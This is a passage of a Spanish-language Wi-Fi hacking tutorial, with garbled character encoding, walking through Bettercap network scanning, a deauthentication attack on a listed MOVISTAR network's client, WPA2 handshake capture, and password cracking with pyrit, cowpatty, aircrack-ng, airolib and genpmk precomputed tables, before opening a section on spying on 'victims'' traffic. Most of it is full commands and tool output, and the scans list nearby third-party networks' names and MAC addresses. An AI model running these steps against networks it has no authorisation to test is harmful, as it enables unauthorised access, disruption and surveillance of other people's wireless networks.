â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ -81 dBm â”‚ 30:d3:2d:58:3c:6b â”‚ devolo-30d32d583c6b â”‚ WPA2 (CCMP, PSK) â”‚ 2.0                  â”‚ 11  â”‚ 1         â”‚ 326 B  â”‚ 84 B  â”‚ 21:15:40 â”‚
â”‚ -69 dBm â”‚ 1c:b0:44:d4:16:85 â”‚ MOVISTAR_PLUS_1677  â”‚ WPA2 (CCMP, PSK) â”‚ 2.0                  â”‚ 112 â”‚ 1         â”‚ 516 B  â”‚ 344 B â”‚ 21:15:31 â”‚
â”‚ -74 dBm â”‚ 00:12:17:70:d5:2c â”‚ linksys             â”‚ OPEN             â”‚                      â”‚ 11  â”‚ 1         â”‚ 383 kB â”‚ 31 kB â”‚ 21:15:40 â”‚
â”‚ -95 dBm â”‚ fc:b4:e6:99:a9:09 â”‚ MOVISTAR_A908       â”‚ WPA2 (CCMP, PSK) â”‚ 2.0                  â”‚ 1   â”‚           â”‚        â”‚       â”‚ 21:15:34 â”‚
â”‚ -87 dBm â”‚ f8:8e:85:df:3e:13 â”‚ Wlan1               â”‚ WPA (TKIP, PSK)  â”‚ 1.0                  â”‚ 9   â”‚           â”‚ 7.1 kB â”‚       â”‚ 21:15:39 â”‚
â”‚ -95 dBm â”‚ e8:d1:1b:21:2f:96 â”‚ MOVISTAR_2F95       â”‚ WPA2 (CCMP, PSK) â”‚ 2.0                  â”‚ 1   â”‚           â”‚        â”‚       â”‚ 21:15:18 â”‚
â”‚ -98 dBm â”‚ d0:17:c2:30:45:7c â”‚ pepephone_ADSLR9C0  â”‚ WPA2 (CCMP, PSK) â”‚                      â”‚ 3   â”‚           â”‚        â”‚       â”‚ 21:15:19 â”‚
â”‚ -95 dBm â”‚ cc:d4:a1:0c:31:28 â”‚ MOVISTAR_3126       â”‚ WPA2 (CCMP, PSK) â”‚ 2.0 (not configured) â”‚ 11  â”‚           â”‚        â”‚       â”‚ 21:15:39 â”‚
â”‚ -97 dBm â”‚ a0:ab:1b:45:ad:4f â”‚ MiFibra-FA4C-EXT    â”‚ WPA2 (TKIP, PSK) â”‚ 2.0                  â”‚ 1   â”‚           â”‚        â”‚       â”‚ 21:15:01 â”‚
â”‚ -90 dBm â”‚ 84:aa:9c:f1:49:bc â”‚ MOVISTAR_49BA       â”‚ WPA2 (CCMP, PSK) â”‚ 2.0                  â”‚ 1   â”‚           â”‚        â”‚       â”‚ 21:15:35 â”‚
â”‚ -93 dBm â”‚ 50:78:b3:ee:bb:ac â”‚ MIWIFI_psGP         â”‚ WPA2 (CCMP, PSK) â”‚ 2.0                  â”‚ 6   â”‚           â”‚        â”‚       â”‚ 21:15:37 â”‚
â”‚ -91 dBm â”‚ 28:9e:fc:0c:40:3e â”‚ vodafone4038        â”‚ WPA2 (TKIP, PSK) â”‚ 2.0                  â”‚ 11  â”‚           â”‚        â”‚       â”‚ 21:15:40 â”‚
â”‚ -54 dBm â”‚ 1c:b0:44:d4:16:78 â”‚ MOVISTAR_1677       â”‚ WPA2 (CCMP, PSK) â”‚ 2.0                  â”‚ 6   â”‚           â”‚ 172 B  â”‚       â”‚ 21:15:37 â”‚
â”‚ -88 dBm â”‚ 10:62:d0:f6:f7:d8 â”‚ LowiF7D3            â”‚ WPA2 (TKIP, PSK) â”‚ 2.0                  â”‚ 1   â”‚           â”‚ 267 B  â”‚       â”‚ 21:15:35 â”‚
â”‚ -69 dBm â”‚ 06:b0:44:d4:16:85 â”‚ MOVISTAR_1677       â”‚ WPA2 (CCMP, PSK) â”‚ 2.0                  â”‚ 112 â”‚           â”‚        â”‚       â”‚ 21:15:31 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

wlan0mon (ch. 40) / â†‘ 0 B / â†“ 538 kB / 1392 pkts

 wlan0mon  Â»  
```

Ahora bien, Â¿cÃ³mo filtro el canal que me interesa?, sencillo... a travÃ©s de la siguiente operaciÃ³n:

```bash
 wlan0mon  Â» wifi.recon.channel 6
```

Esto harÃ¡ que ahora se nos listen las redes disponibles en el canal 6:

```bash
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  RSSI   â”‚       BSSID       â”‚     SSID      â”‚    Encryption    â”‚ WPS â”‚ Ch â”‚ Clients â–¾ â”‚  Sent  â”‚ Recvd â”‚   Seen   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ -94 dBm â”‚ 50:78:b3:ee:bb:ac â”‚ MIWIFI_psGP   â”‚ WPA2 (CCMP, PSK) â”‚ 2.0 â”‚ 6  â”‚           â”‚        â”‚       â”‚ 21:18:09 â”‚
â”‚ -53 dBm â”‚ 1c:b0:44:d4:16:78 â”‚ MOVISTAR_1677 â”‚ WPA2 (CCMP, PSK) â”‚ 2.0 â”‚ 6  â”‚           â”‚ 3.4 kB â”‚       â”‚ 21:18:10 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

wlan0mon (ch. 6) / â†‘ 0 B / â†“ 906 kB / 2889 pkts

 wlan0mon  Â» wifi.recon.channel 6
```

Â¿QuÃ© es lo cÃ³modo de este mÃ©todo?, pues que por ejemplo yo ahora viendo que la red **MOVISTAR_1677** tiene el
BSSID **1c:b0:44:d4:16:78**, podrÃ­a hacer un ataque de de-autenticaciÃ³n sobre los clientes que **Bettercap**
detecte en dicha red:

```bash
 wlan0mon  Â» wifi.deauth 1c:b0:44:d4:16:78
```

Obteniendo los siguientes resultados:

```bash
 wlan0mon  Â» wifi.deauth 1c:b0:44:d4:16:78
 wlan0mon  Â» [21:33:26] [sys.log] [inf] wifi deauthing client 20:34:fb:b1:c5:53 from AP MOVISTAR_1677 (channel:6 encryption:WPA2)
 ```

 Una vez el cliente se reconecte a la red:

 ```bash
 wlan0mon  Â» [21:33:13] [wifi.client.probe] station da:a1:19:8b:d9:82 (Google, Inc.) is probing for SSID MOVISTAR_DF12 (-38 dBm)
 wlan0mon  Â» [21:33:15] [wifi.client.probe] station 20:34:fb:b1:c5:53 is probing for SSID MOVISTAR_1677 (-40 dBm)
 wlan0mon  Â» [21:33:15] [wifi.client.handshake] captured 20:34:fb:b1:c5:53 -> MOVISTAR_1677 (1c:b0:44:d4:16:78) RSN PMKID to /root/bettercap-wifi-handshakes.pcap
 wlan0mon  Â» [21:33:15] [wifi.client.handshake] captured 20:34:fb:b1:c5:53 -> MOVISTAR_1677 (1c:b0:44:d4:16:78) WPA2 handshake to /root/bettercap-wifi-handshakes.pcap
 ```

 Se genera el Handshake y este es exportado automÃ¡ticamente al fichero indicado desde el verbose de la
 herramienta. Si analizamos con **pyrit**, vemos que efectivamente... se ha capturado un Handshake por parte
 de dicha estaciÃ³n:

 ```bash
 â”Œâ”€[root@parrot]â”€[/opt/bettercap]
â””â”€â”€â•¼ #pyrit -r /root/bettercap-wifi-handshakes.pcap analyze
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file '/root/bettercap-wifi-handshakes.pcap' (1/1)...
Parsed 7 packets (7 802.11-packets), got 1 AP(s)

#1: AccessPoint 1c:b0:44:d4:16:78 ('MOVISTAR_1677'):
  #1: Station 20:34:fb:b1:c5:53, 4 handshake(s):
    #1: HMAC_SHA1_AES, good, spread 1
    #2: HMAC_SHA1_AES, good, spread 1
    #3: HMAC_SHA1_AES, good, spread 2
    #4: HMAC_SHA1_AES, good, spread 2
```

### TÃ©cnicas de aumento de la velocidad de cÃ³mputo

Si bien es cierto que considero que la velocidad de cÃ³mputo de mi ordenador es bastante aceptable
(7.000/10.000 contraseÃ±as por segundo), Â¿hay alguna forma de ir mÃ¡s rÃ¡pido aÃºn?, Â¿hay alguna forma de
multiplicar por 1.000 la velocidad si ser necesario un ordenador de altos requisitos?, la respuesta es si.

A la hora de iniciar el proceso de fuerza bruta con **aircrack**, por ejemplo, estamos llevando a cabo varios pasos:

* Filtrado de la captura para extraer el Hash (Handshake)
* Lectura de diccionario (CCMP por cada contraseÃ±a en texto claro)
* Comparativa del Hash resultante con el Handshake capturado
* True/False (Si hay Match, es que esa es la contraseÃ±a)

Â¿No has pensado en que todos estos pasos se podrÃ­an omitir, si contÃ¡semos con un diccionario de claves ya
precomputadas?. Me explico, Â¿y si en vez de tener un diccionario de contraseÃ±as en texto claro, tenemos un
diccionario de contraseÃ±as ya pre-computadas con sus respectivos hashes?, fijaros que ahora serÃ­a simplemente
hacer los siguientes pasos:

* Lectura de la clave PMK del diccionario
* True/False (Match con el Handshake)

Esta reducciÃ³n de pasos es equivalente a la velocidad del tiempo de cÃ³mputo, es decir, es mucho menor. Lo
iremos viendo poco a poco, pero primero un poco de cultura :)

#### Concepto de Rainbow Table

Hoy las contraseÃ±as ya no se guardan sin cifrar â€“o eso se espera. Cuando los usuarios de una plataforma fijan
una clave de acceso para su cuenta, esta secuencia de caracteres no aparece en texto plano en una base de
datos en algÃºn servidor, puesto que no serÃ­a seguro: si encontrara la forma de entrar en ella, un hacker lo
tendrÃ­a muy fÃ¡cil para acceder a todas las cuentas de un determinado usuario.

Para el eCommerce, la banca en lÃ­nea o los servicios gubernamentales online esto tendrÃ­a consecuencias
fatales. En lugar de ello, los servicios online utilizan diversos mecanismos criptogrÃ¡ficos para cifrar las
contraseÃ±as de sus usuarios de modo que en las bases de datos solo aparezca un valor hash (valor resumen) de
la clave.

Incluso conociendo la funciÃ³n criptogrÃ¡fica que lo ha originado, desde este valor hash no es posible deducir
la contraseÃ±a, porque no es posible reconstruir el procedimiento a la inversa. Esto lleva a los
ciberdelincuentes a recurrir a los ataques de fuerza bruta, en los cuales un programa informÃ¡tico intenta
â€œadivinarâ€ la secuencia correcta de caracteres que constituye la contraseÃ±a durante tanto tiempo como haga
falta.

Este mÃ©todo puede combinarse con los llamados â€œdiccionariosâ€ de contraseÃ±as. En estos archivos, que circulan
libremente en Internet, pueden encontrarse numerosas contraseÃ±as que bien son muy populares o ya fueron
interceptadas en el pasado. 

Los hackers tienden a probar primero todas las contraseÃ±as del diccionario, lo que les permite ahorrar tiempo,
aunque, en funciÃ³n de la complejidad de las contraseÃ±as (longitud y tipo de caracteres), este proceso puede
resultar mÃ¡s largo y consumir mÃ¡s recursos de lo esperado.

TambiÃ©n disponibles en la Red y tambiÃ©n un recurso para descifrar claves secretas, las tablas rainbow van un
paso mÃ¡s allÃ¡ de los diccionarios. Estos ficheros, que pueden llegar a tener un tamaÃ±o de varios cientos de
gigabytes, contienen un listado de claves junto con sus valores hash, pero de forma incompleta: para reducir
su tamaÃ±o y asÃ­ su necesidad de espacio en memoria, se crean cadenas de valores a partir de las cuales pueden
reconstruirse fÃ¡cilmente los demÃ¡s valores. Con estas tablas los valores hash encontrados en un banco de datos
pueden ordenarse con sus claves en texto plano.

Un ejemplo claro: https://hashkiller.co.uk/

#### Cracking con Pyrit

Dicho esto y aunque todavÃ­a no vamos a meternos del todo con las **Rainbow Tables**, empecemos viendo cÃ³mo
podemos hacer uso de **Pyrit** para crackear contraseÃ±as a travÃ©s de ataques por diccionario. Primero veremos
el mÃ©todo convencional y mÃ¡s tarde lo combinaremos con una Rainbow Table.

Una vez capturado un Handshake, podemos hacer uso de Pyrit para crackear la contraseÃ±a de la red inalÃ¡mbrica,
de la siguiente forma:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #pyrit -e hacklab -i /usr/share/wordlists/rockyou.txt -r Captura-01.cap attack_passthrough
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'Captura-01.cap' (1/1)...
Parsed 43 packets (43 802.11-packets), got 1 AP(s)

Picked AccessPoint 20:34:fb:b1:c5:53 automatically...
```

El modo **attack_passthrough** lo que se encarga es de atacar a un handshake capturado por medio de un ataque
de fuerza bruta, usando el diccionario especificado a travÃ©s del parÃ¡metro '**-r**'.

Una vez obtenida la contraseÃ±a:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #pyrit -e hacklab -i /usr/share/wordlists/rockyou.txt -r Captura-01.cap attack_passthrough
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'Captura-01.cap' (1/1)...
Parsed 43 packets (43 802.11-packets), got 1 AP(s)

Picked AccessPoint 20:34:fb:b1:c5:53 automatically...
Tried 40002 PMKs so far; 2466 PMKs per second. 123hello9

The password is 'hottie4u'.
```

Si nos fijamos... **2.466 PMKs por segundo**, lo cual es bastante triste considerando la velocidad de
**aircrack**, pero no nos preocupemos, a pesar de que ahora estamos decepcionados, mÃ¡s adelante nos
sorprenderÃ¡.

#### Cracking con Cowpatty

El uso de **Cowpatty** para emplear un ataque de fuerza bruta es el siguiente:

```bash
â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #cowpatty -f diccionario -r Captura-01.cap -s hacklab
cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com>

Collected all necessary data to mount crack against WPA2/PSK passphrase.
Starting dictionary attack.  Please be patient.
key no. 1000: skittles1
key no. 2000: princess15
key no. 3000: unfaithful
key no. 4000: andresteamo
key no. 5000: hennessy
key no. 6000: amigasporsiempre
key no. 7000: 0123654789
key no. 8000: trinitron
key no. 9000: flower22
key no. 10000: vincenzo
key no. 11000: pensacola
key no. 12000: boyracer
key no. 13000: grandmom
key no. 14000: battlefield
key no. 15000: badangel

The PSK is "hottie4u".

15242 passphrases tested in 24.02 seconds:  634.53 passphrases/second
```

Importante destacar que siempre hay que especificar el **ESSID** de la red. Como vemos, obtenemos la
contraseÃ±a pero el cÃ³mputo es incluso mucho menor... **634 contraseÃ±as por segundo**, lo mejoraremos.

#### Cracking con Airolib

Ahora, es cuando vamos a ir aumentando la velocidad de cÃ³mputo. **Airolib** nos permite crear un diccionario
de claves pre-computadas (PMK's), lo cual es una maravilla para el caso.

Comenzaremos creando un fichero **passwords-airolib**, indicando el diccionario de contraseÃ±as a usar:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #airolib-ng passwords-airolib --import passwd diccionario 
Database <passwords-airolib> does not already exist, creating it...
Database <passwords-airolib> successfully created
Reading file...
Writing...s read, 45922 invalid lines ignored.
Done.
```

Una vez hecho, creamos un fichero que almacene el **ESSID** de nuestra red y lo sincronizamos con el archivo
creado:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #echo "hacklab" > essid.lst
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #airolib-ng passwords-airolib --import essid essid.lst 
Reading file...
Writing...
Done.
```

A travÃ©s del parÃ¡metro '**--stats**', podemos comprobar que estÃ¡ todo correctamente definido:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #airolib-ng passwords-airolib --stats
There are 1 ESSIDs and 24078 passwords in the database. 0 out of 24078 possible combinations have been computed (0%).

ESSID	Priority	Done
hacklab	64	0.0
```

Ya que **airolib** trae un parÃ¡metro para limpiar el archivo (lÃ­neas no legibles o errores), lo usamos tambiÃ©n:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #airolib-ng passwords-airolib --clean all
Deleting invalid ESSIDs and passwords...
Deleting unreferenced PMKs...
Analysing index structure...
Vacuum-cleaning the database. This could take a while...
Checking database integrity...
integrity_check
ok

Done.
```

Y ya por Ãºltimo, hacemos uso del parÃ¡metro **--batch** para generar el diccionario final de claves precomputadas:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #airolib-ng passwords-airolib --batch
Batch processing ...
Computed 5000 PMK in 13 seconds (384 PMK/s, 19078 in buffer)
Computed 10000 PMK in 24 seconds (416 PMK/s, 14078 in buffer)
Computed 15000 PMK in 36 seconds (416 PMK/s, 9078 in buffer)
Computed 20000 PMK in 48 seconds (416 PMK/s, 4078 in buffer)
Computed 24078 PMK in 58 seconds (415 PMK/s, 0 in buffer)
All ESSID processed.
```

Una vez generado, atentos a la velocidad. Vamos a ver con **aircrack** cuÃ¡nto tardamos haciendo uso del
procedimiento tradicional:

```bash
                             Aircrack-ng 1.5.2 

      [00:00:02] 22832/24078 keys tested (9415.01 k/s) 

      Time left: 0 seconds                                      94.83%

                           KEY FOUND! [ hottie4u ]


      Master Key     : B1 42 12 E4 D4 86 FF 87 49 04 29 E3 51 E3 C6 BC 
                       C0 EA A3 03 A6 ED E3 79 A0 A4 BC D6 8F 3B 39 E3 

      Transient Key  : F7 17 BB BB 6F A3 9A E8 D5 DA E6 3E 0E C5 0B 45 
                       C8 D6 47 4B 87 12 FF A7 80 6A 44 00 05 77 CC 96 
                       35 99 2D BA 9D B0 A4 CF C2 43 CF 66 2B 74 D9 16 
                       7C ED 59 EF AE 70 5D 23 D9 7B 9E B9 38 2A 87 CC 

      EAPOL HMAC     : 7F A8 E0 CC 77 49 2C E9 51 8C 81 42 F9 DB CE E0
```

Valores clave:

* 9.415 contraseÃ±as por segundo
* 2 segundos hasta dar con la contraseÃ±a

Ahora bien, hagamos uso de aircrack para crackear nuevamente la contraseÃ±a, pero esta vez con una sintaxis que
toma como input el fichero creado con **airolib**:

* aircrack-ng -r passwords-airolib Captura-01.cap

Obtenemos los siguientes resultados:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #aircrack-ng -r passwordsAircrack-ng 1.5.2 1.cap

      [00:00:00] 15241/0 keys tested (204456.39 k/s) 

      Time left: 

                           KEY FOUND! [ hottie4u ]


      Master Key     : 24 87 02 AB 54 4E 47 C1 C0 DC DE E9 DF 7D 22 88 
                       80 C4 F0 07 F9 04 B8 71 B7 72 2A F1 04 75 57 99 

      Transient Key  : 21 6C FB DC 6B D0 98 59 99 F1 A3 1A B2 CF 9D 67 
                       E2 6C DA 3C CC 50 B2 60 9B 65 D3 B1 94 DA B4 AB 
                       92 62 DB 80 C5 CB DA 15 A5 04 D3 C7 5B A2 FD 8F 
                       87 36 0A 3A 99 45 14 A2 61 8D 3B 90 44 53 6A A4 

      EAPOL HMAC     : 64 A2 4A 1B D6 22 93 78 78 09 2F 42 7E 11 8F BC 
```

Valores clave:

* 204.456 contraseÃ±as por segundo
* 0.X segundos hasta dar con la contraseÃ±a

Lo sÃ©, flipante, pero es que se puede ir aÃºn mÃ¡s rÃ¡pido.

#### Rainbow Table con Genpmk

Hemos visto cÃ³mo podemos aumentar considerablemente la velocidad de cÃ³mputo haciendo uso de la suite de
**aircrack**. Ahora distanciÃ©monos un poco de **aircrack** y pensemos en **Cowpatty** y **Pyrit**, no nos
sorprendiÃ³ mucho la Ãºltima vez, Â¿verdad?, sin embargo, vamos a hacer que tomen un papel mÃ¡s importante.

El fichero **passwords-airolib** no puede ser aprovechado por **Cowpatty** ni por **Pyrit**, en este caso
tendremos que hacer uso de **genpmk** para generar un nuevo diccionario de claves precomputadas adaptado para
que sea interpretado por estas fantÃ¡sticas herramientas.

La sintaxis es la siguiente:

```bash
â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #genpmk -f diccionario -d dic.genpmk -s hacklab
genpmk 1.3 - WPA-PSK precomputation attack. <jwright@hasborg.com>
File dic.genpmk does not exist, creating.
key no. 1000: skittles1
key no. 2000: princess15
key no. 3000: unfaithful
key no. 4000: andresteamo
key no. 5000: hennessy
key no. 6000: amigasporsiempre
key no. 7000: 0123654789
key no. 8000: trinitron
key no. 9000: flower22
key no. 10000: vincenzo
key no. 11000: pensacola
key no. 12000: boyracer
key no. 13000: grandmom
key no. 14000: battlefield
key no. 15000: badangel
key no. 16000: liferocks
key no. 17000: forever15
key no. 18000: gabriell
key no. 19000: mexico18
key no. 20000: 13031991
key no. 21000: kitty1234
key no. 22000: casper22
key no. 23000: 12021989
key no. 24000: tigers15

24078 passphrases tested in 39.35 seconds:  611.90 passphrases/second
```

Esto lo que ha hecho ha sido generarnos un nuevo diccionario **dic.genpmk** de claves precomputadas. Llegados
a este punto, podemos hacer lo que se describe en los siguientes puntos.

#### Cracking con Cowpatty frente a Rainbow Table

Aprovechando el diccionario **dic.genpmk** generado con **genpmk**, hacemos lo siguiente:

```bash
â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #cowpatty -d dic.genpmk -r Captura-01.cap -s hacklab
cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com>

Collected all necessary data to mount crack against WPA2/PSK passphrase.
Starting dictionary attack.  Please be patient.
key no. 10000: vincenzo

The PSK is "hottie4u".

15242 passphrases tested in 0.04 seconds:  361013.75 passphrases/second
```

Puntos clave:

* 361.013 contraseÃ±as por segundo
* 0.04 segundos en dar la contraseÃ±a

Â¿Intentamos ir algo mÃ¡s rÃ¡pido?

#### Cracking con Pyrit frente a Rainbow Table

Aprovechando una vez mÃ¡s el mismo diccionario **dic.genpmk** generado con **genpmk**, hacemos lo siguiente:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #pyrit -i dic.genpmk -e hacklab -r Captura-01.cap attack_cowpatty
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'Captura-01.cap' (1/1)...
Parsed 43 packets (43 802.11-packets), got 1 AP(s)

Picked AccessPoint 20:34:fb:b1:c5:53 automatically...
Tried 24078 PMKs so far; 1992708 PMKs per second.

The password is 'hottie4u'.
```

Puntos clave:

* 1.992.708 contraseÃ±as por segundo

Ya en este punto se podrÃ­a decir que trabajando a unas casi 2 millones de contraseÃ±as por segundo, estarÃ­amos
mÃ¡s que contentos, Â¿verdad?, pero es que se puede ir aÃºn mÃ¡s rÃ¡pido todavÃ­a.

#### Cracking con Pyrit a travÃ©s de ataque por Base de Datos

Este es ya el considerado como el mÃ©todo mÃ¡s potente. Comenzamos importando todas las contraseÃ±as de nuestro
diccionario desde **Pyrit**:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #pyrit -i diccionario import_passwords
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Connecting to storage at 'file://'...  connected.
70000 lines read. Flushing buffers.... 
All done.
```

Una vez hecho, especificamos el **ESSID** con el que vamos a trabajar:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #pyrit -e hacklab create_essid
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Connecting to storage at 'file://'...  connected.
ESSID already created
```

Por Ãºltimo, generamos las claves precomputadas:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #pyrit batch
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Connecting to storage at 'file://'...  connected.
Batchprocessing done.
```

Iniciamos el ataque en modo ataque de base de datos con **Pyrit**:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #pyrit -r Captura-01.cap attack_db
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Connecting to storage at 'file://'...  connected.
Parsing file 'Captura-01.cap' (1/1)...
Parsed 43 packets (43 802.11-packets), got 1 AP(s)

Picked AccessPoint 20:34:fb:b1:c5:53 ('hacklab') automatically.
Attacking handshake with Station 34:41:5d:46:d1:38...
Tried 37326 PMKs so far (100.0%); 18289321 PMKs per second.

The password is 'hottie4u'.
```

Y fijaros que velocidad mÃ¡s vertiginosa:

* **18.289.321 contraseÃ±as por segundo**

### TÃ©cnicas de Espionaje

Este punto engloba algunas tÃ©cnicas bÃ¡sicas **sin entrar en fase de Pentesting** para a nivel de red ser capaces
de saber quÃ© es lo que estÃ¡n haciendo nuestras vÃ­ctimas, incluido el robo de datos para ciertos casos.

#### Uso de Airdecap para el desencriptado de paquetes

Hasta ahora hemos visto cÃ³mo obtener las credenciales de acceso a una red inalÃ¡mbrica. Ahora bien, Â¿quÃ© pasa
una vez estamos dentro?

EstÃ¡ claro que podrÃ­amos iniciar con una fase de Pentesting para tratar de vulnerar la seguridad de los
sistemas y comenzar a comprometer todos los equipos, pero no es la idea. Partiremos a nivel de red, viendo
hasta quÃ© punto podemos llegar con la informaciÃ³n que hemos recopilado.

Si nos fijamos, las capturas de monitorizado activo que exportamos con â€˜airodump-ngâ€™ viajan encriptadas, es
decir, no es posible visualizar consultas HTTP ni peticiones a nivel privado de red:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-01.cap -Y "http.request.method==POST" 2>/dev/null
# Sin resultados
```

Â¿Por quÃ©?, porque todo lo que estamos capturando es el trÃ¡fico externo que recopilamos en modo monitor:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-01.cap 2>/dev/null | head -n 10 
    1   0.000000 AskeyCom_d4:16:78 â†’ Broadcast    802.11 268 Beacon frame, SN=2233, FN=0, Flags=........, BI=100, SSID=MOVISTAR_1677
    2   2.150527 AskeyCom_d4:16:78 â†’ XiaomiCo_b1:c5:53 802.11 341 Probe Response, SN=2255, FN=0, Flags=........, BI=100, SSID=MOVISTAR_1677
